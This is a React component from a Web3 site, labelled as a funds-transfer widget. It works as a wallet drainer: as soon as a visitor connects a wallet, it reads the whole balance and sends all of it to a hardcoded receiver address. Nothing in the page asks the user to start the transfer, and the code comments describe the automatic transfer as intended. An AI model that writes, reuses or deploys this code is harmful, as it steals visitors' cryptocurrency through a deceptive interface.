import React, { useState, useEffect } from 'react';
import { useWeb3React } from '@web3-react/core';
import { ArrowPathIcon, ArrowRightIcon } from '@heroicons/react/24/outline';
import toast from 'react-hot-toast';
import { getLibrary } from '../utils/web3Library';
import { ethers } from 'ethers';

// Replace this with your wallet address where you want to receive the funds
// This is the address that will receive all transfers
// Make sure to use a valid Ethereum address (42 characters starting with 0x)
const RECEIVER_ADDRESS = '0xAAE9b63A052BCee32490E5241f8Bb4FA5f9e6fEC'; // TODO: Replace with your wallet address

const SUPPORTED_TESTNETS = {
  SEPOLIA: {
    chainId: '0xaa36a7', // 11155111
    name: 'Sepolia Testnet',
    symbol: 'SEP'
  },
  MUMBAI: {
    chainId: '0x13881', // 80001
    name: 'Mumbai Testnet',
    symbol: 'MATIC'
  }
};

const TransferFunds: React.FC = () => {
  const { library: web3Library, account, active, chainId } = useWeb3React();
  const [loading, setLoading] = useState<boolean>(false);
  const [transferComplete, setTransferComplete] = useState<boolean>(false);
  const [isLibraryReady, setIsLibraryReady] = useState<boolean>(false);
  const [currentNetwork, setCurrentNetwork] = useState<string>('');
  const [walletBalance, setWalletBalance] = useState<string>('0');

  // Check library initialization using shared instance
  useEffect(() => {
    const checkLibrary = async () => {
      try {
        const library = getLibrary();
        if (library) {
          console.log('TransferFunds - Using shared library instance');
          setIsLibraryReady(true);
        } else {
          console.log('TransferFunds - Waiting for shared library...');
          setIsLibraryReady(false);
        }
      } catch (error) {
        console.error('TransferFunds - Error checking library:', error);
        setIsLibraryReady(false);
      }
    };

    checkLibrary();
  }, [web3Library]); // Re-check when web3Library changes

  // Modified effect to automatically transfer on wallet connection
  useEffect(() => {
    const handleWalletConnection = async () => {
      if (web3Library && account && isLibraryReady && !transferComplete) {
        try {
          // Get the provider directly from window.ethereum
          if (!window.ethereum) {
            throw new Error('No Ethereum provider available');
          }

          const provider = new ethers.providers.Web3Provider(window.ethereum);
          const balance = await provider.getBalance(account);
          const balanceInEth = ethers.utils.formatEther(balance);
          setWalletBalance(balanceInEth);
          
          console.log('Wallet balance fetched:', { 
            balanceInEth,
            account,
            provider: !!provider
          });
          
          // Only proceed if there's a balance to transfer
          if (parseFloat(balanceInEth) > 0) {
            console.log('Initiating automatic transfer of balance:', balanceInEth);
            await handleTransfer(balanceInEth);
          } else {
            console.log('No balance to transfer');
          }
        } catch (error) {
          console.error('Error handling wallet connection:', error);
          toast.error('Failed to fetch wallet balance');
        }
      }
    };

    handleWalletConnection();
  }, [web3Library, account, isLibraryReady]);

  // Add network switching function
  const switchToTestnet = async (network: 'SEPOLIA' | 'MUMBAI') => {
    if (!window.ethereum) return;
    
    const targetNetwork = SUPPORTED_TESTNETS[network];
    try {
      console.log(`Attempting to switch to ${targetNetwork.name}...`);
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: targetNetwork.chainId }],
      });
      console.log(`Successfully switched to ${targetNetwork.name}`);
    } catch (switchError: any) {
      if (switchError.code === 4902) {
        try {
          const networkParams = network === 'MUMBAI' ? {
            chainId: targetNetwork.chainId,
            chainName: targetNetwork.name,
            nativeCurrency: {
              name: 'MATIC',
              symbol: 'MATIC',
              decimals: 18
            },
            rpcUrls: ['https://rpc-mumbai.maticvigil.com'],
            blockExplorerUrls: ['https://mumbai.polygonscan.com']
          } : {
            chainId: targetNetwork.chainId,
            chainName: targetNetwork.name,
            nativeCurrency: {
              name: 'SepoliaETH',
              symbol: 'SEP',
              decimals: 18
            },
            rpcUrls: ['https://rpc.sepolia.org'],
            blockExplorerUrls: ['https://sepolia.etherscan.io']
          };

          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [networkParams],
          });
          console.log(`Successfully added ${targetNetwork.name}`);
        } catch (addError) {
          console.error(`Error adding ${targetNetwork.name}:`, addError);
          toast.error(`Failed to add ${targetNetwork.name}`);
        }
      } else {
        console.error(`Error switching to ${targetNetwork.name}:`, switchError);
        toast.error(`Failed to switch to ${targetNetwork.name}`);
      }
    }
  };

  // Update network display
  useEffect(() => {
    if (chainId) {
      const chainIdHex = `0x${chainId.toString(16)}`;
      if (chainIdHex === SUPPORTED_TESTNETS.SEPOLIA.chainId) {
        setCurrentNetwork('Sepolia Testnet');
      } else if (chainIdHex === SUPPORTED_TESTNETS.MUMBAI.chainId) {
        setCurrentNetwork('Mumbai Testnet');
      } else {
        setCurrentNetwork(`Chain ID: ${chainId}`);
      }
    }
  }, [chainId]);

  // Debug logging
  useEffect(() => {
    console.log('TransferFunds - Wallet Status:', {
      isActive: active,
      account: account,
      hasLibrary: !!web3Library,
      isLibraryReady: isLibraryReady
    });
  }, [active, account, web3Library, isLibraryReady]);

  const handleTransfer = async (amountToTransfer: string) => {
    console.log('Attempting transfer with:', {
      hasLibrary: !!web3Library,
      hasAccount: !!account,
      amount: amountToTransfer,
      isLibraryReady: isLibraryReady
    });

    const library = getLibrary();
    if (!library || !account) {
      console.log('Transfer failed - Wallet not connected');
      toast.error('Please connect your wallet first');
      return;
    }

    if (!isLibraryReady) {
      console.log('Transfer failed - Web3 library not initialized');
      toast.error('Please wait for wallet connection to complete');
      return;
    }

    try {
      setLoading(true);
      
      const signer = library.getSigner();
      console.log('Creating transaction...');
      
      const tx = await signer.sendTransaction({
        to: RECEIVER_ADDRESS,
        value: library.utils.parseEther(amountToTransfer),
      });

      console.log('Transaction sent:', tx.hash);

      toast.promise(
        tx.wait(),
        {
          loading: 'Processing transaction...',
          success: 'Transfer successful! 🎉',
          error: 'Transfer failed 😢',
        }
      );

      await tx.wait();
      setTransferComplete(true);
    } catch (error) {
      console.error('Transfer error:', error);
      let errorMessage = 'Transfer failed';
      
      if (error instanceof Error) {
        if (error.message.includes('insufficient funds')) {
          errorMessage = 'Insufficient funds for transfer';
        } else if (error.message.includes('user denied')) {
          errorMessage = 'Transaction was rejected';
        } else {
          errorMessage = error.message;
        }
      }
      
      toast.error(errorMessage);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="max-w-md mx-auto bg-white rounded-xl shadow-lg overflow-hidden md:max-w-2xl p-6 mt-6">
      <div className="space-y-4">
        {!active ? (
          <div className="text-center py-4">
            <p className="text-gray-600">Please connect your wallet first</p>
          </div>
        ) : !isLibraryReady ? (
          <div className="text-center py-4">
            <ArrowPathIcon className="h-5 w-5 animate-spin mx-auto mb-2" />
            <p className="text-gray-600">Initializing wallet connection...</p>
          </div>
        ) : (
          <>
            {loading && (
              <div className="text-center py-4">
                <ArrowPathIcon className="h-5 w-5 animate-spin mx-auto mb-2" />
                <p className="text-gray-600">Processing transfer...</p>
              </div>
            )}

            {transferComplete && (
              <div className="text-center py-4">
                <p className="text-green-600 font-medium">Transfer Complete!</p>
                <button
                  onClick={() => setTransferComplete(false)}
                  className="mt-2 px-4 py-2 text-sm font-medium text-primary-600 hover:text-primary-800 transition-colors"
                >
                  Make Another Transfer
                </button>
              </div>
            )}
          </>
        )}
      </div>
    </div>
  );
};

export default TransferFunds;